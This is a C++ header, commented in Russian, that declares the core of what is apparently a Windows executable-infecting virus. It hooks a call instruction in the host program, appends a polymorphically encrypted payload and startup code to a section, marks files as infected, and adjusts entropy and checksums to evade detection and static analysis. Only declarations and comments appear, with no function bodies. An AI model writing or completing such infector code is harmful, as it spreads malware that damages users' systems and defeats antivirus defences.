#pragma once

#include "global.hpp"
#include "sectionappender.hpp"
#include "flow_disasm.hpp"
#include "codegen.hpp"
#include "restorator.hpp"
#include "dna.hpp"

struct OffsetStruct
{
	DWORD32 RVA; 
	DWORD32 FileOffset;
};

struct call_inst
{
	OffsetStruct offset; // RVA и FileOffset инструкции
	INT rel32_decoded; // декодированный rel32 - signed значение, смещение вызова
	DWORD32 RVA_Target; // RVA инструкции на которую переходит вызов, высчитывается как RVA следующей инструкции (RVA инструкции + 5) +- rel32
};

// интерфейс инфектора, в process_file передается хэндл уже открытого файла для инфекта и указатель на начало капсида и архитектуру файла
class IInfector
{
public:
	virtual ~IInfector() = default;
	// заразить данный файл
	virtual BOOL process_file(HANDLE hFile, capsid_metadata *capsid, DWORD dwArch, IDNAProcessor *dna) = 0;
};

// инфектор исполняемых файлов
class exe_infector : protected IInfector
{
public:
	exe_infector();
	~exe_infector();
	BOOL process_file(HANDLE hFile, capsid_metadata *capsid, DWORD dwArch, IDNAProcessor *dna);
protected:
	// находит в файле офсеты до call rel32 для перехвата
	BOOL find_call_victim(HANDLE hFile, DWORD dwArch);
	// производит перехват target_call на новый RVA
	// dwTargetRVA - RVA инструкции на которую совершается переход
	// перехват производится через перезапись операнда rel32 у E8 xx xx xx xx лежащему по файловому офсету в target_call
	// rel32 высчитывается как разница между dwTargetRVA с RVA следующей инструкции за target_call (+5 от RVA target_call) 
	// кодируется как little endian DWORD и записывается по файловому офсету операнда target_call
	BOOL install_hook(HANDLE hFile, DWORD32 dwTargetRVA);
	// зашифрует полиморфным алгоритмом капсид и приаппендит его к концу секции
	BOOL append_capsid(HANDLE hFile, capsid_metadata *capsid, appender::appender_status *out_status, DWORD dwArch);
	// приаппендит к концу секции стартап код и сразу же за ним добавит завершитель этого кода в зависимости от ДНК-параметров соответствующих
	// нужно для того, чтобы запутать статический анализ стартап кода, так как в рекавери функции конец стартап кода будет модифицирован и завершитель не исполнится
	BOOL append_startup(HANDLE hFile, LPBYTE lpStartupCode, SIZE_T dwStartupSize, appender::appender_status *out_status, DWORD dwArch);
	BOOL dump_restoredata(HANDLE hFile, appender::appender_status *capsid_status, appender::appender_status *startup_status, SIZE_T dwCapsidSize, DWORD32 dwPlaceholderEndStartupRVA);
private:
	appender::LastSectionAppender appender;
	flow_disasm::FlowCallDisassembler disassembler;
	ICodegenEngine *codegenerator;
	IHostRestorator *restorator;
	CallRestoratorBlock crbRestoratorBlock;

	// RVA и файловый офсет до перехватываемого call rel32
	call_inst target_call;

	// процессор ДНК-кода
	IDNAProcessor *dna_processor;

	struct code_sect
	{
		LPBYTE lpBuffer; // указатель на буфер с прочитанной кодовой секцией
		SIZE_T dwBufferSize; // размер буфера
		DWORD32 EntryDelta; // дельта от начала буфера до точки входа
		DWORD32 RVA; // RVA кодовой секции
		DWORD32 FileOffset; // файловый офсет кодовой секции
	};
	// читает кодовую секцию из файла в буфер, если секций несколько то прочитает ту в которую есть точка входа
	BOOL read_code_section(HANDLE hFile, UINT_PTR pNtHeaders, DWORD dwArch, DWORD AddressOfEntryPoint, code_sect *code_section);
	// генерирует код
	BOOL generate_startup_code(capsid_metadata *capsid, DWORD32 capsidEntryRVA, DWORD32 dwOriginalCallRVA, DWORD32 dwCodePlaceRVA, DWORD dwArch, LPBYTE *lpOutputBuffer, SIZE_T *dwOutputBufferSize, PDWORD32 pdwOepReturnRVA);

	VOID set_infected(HANDLE hFile, DWORD dwArch);
	// current_stage - указывает на каком этапе находится инфектор и какой тип фикса энтропии будет если дописать нули прямо сейчас
	BOOL fix_entropy(HANDLE hFile, entropyfix_types_t current_stage, DWORD dwArch, DWORD dwCapsidSize);
	// проверяет есть ли overlay 
	BOOL is_overlay(HANDLE hFile, DWORD dwArch);
	// фиксит чексумму
	BOOL fix_checksum(HANDLE hFile, DWORD dwArch);
	DWORD calc_checksum(HANDLE hFile, DWORD dwArch);
	BOOL zero_checksumfield(LPBYTE lpFileBuffer, DWORD dwBufferSize, DWORD dwArch);
	PDWORD get_checksumptr(LPBYTE lpFileBuffer, DWORD dwBufferSize, DWORD dwArch);
	DWORD32 ChkSum(PWORD pwBuffer, DWORD32 dwInitialSum, DWORD dwBufferSize);
};

// прокси-класс вызывающий exe_infector и передающий нужную архитектуру, dwArch игнорирется
class x64exe_infector : protected IInfector
{
public:
	x64exe_infector();
	~x64exe_infector();
	BOOL process_file(HANDLE hFile, capsid_metadata *capsid, DWORD dwArch, IDNAProcessor *dna);
private:
	IInfector *infector;
};

// прокси-класс вызывающий exe_infector и передающий нужную архитектуру, dwArch игнорирутся
class x86exe_infector : protected IInfector
{
public:
	x86exe_infector();
	~x86exe_infector();
	BOOL process_file(HANDLE hFile, capsid_metadata *capsid, DWORD dwArch, IDNAProcessor *dna);
private:
	IInfector *infector;
};